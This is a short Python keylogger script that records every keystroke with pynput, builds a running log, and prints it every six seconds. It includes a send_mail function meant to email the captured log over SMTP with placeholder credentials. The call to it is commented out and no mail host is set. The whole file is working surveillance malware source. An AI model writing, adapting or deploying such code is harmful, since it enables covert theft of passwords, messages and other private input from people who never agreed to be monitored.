#!/usr/bin/env python
import pynput.keyboard
import threading
import smtplib

log = "Keylogger Started"
interval = 6
email = "test@test.com"
password = "password"

def append_to_log(string):
    global log
    log = log + string

def process_key_press(key):
    try:
        current_key = str(key.char)
    except AttributeError:
        if key == key.space:
            current_key = " "
        else:
            current_key = " " + str(key) + " "
    append_to_log(current_key)

def report():
    global log, interval
    print(log)
    #send_mail(email,password,log)
    log = ""
    timer = threading.Timer(interval,report)
    timer.start()

def send_mail(email,password,message):
    server = smtplib.SMTP()
    server.starttls()
    server.login(email,password)
    server.sendmail(email,email,message)
    server.quit()    

def start():
    keyboard_listener = pynput.keyboard.Listener(on_press=process_key_press)
    with keyboard_listener:
        report()
        keyboard_listener.join()



start()
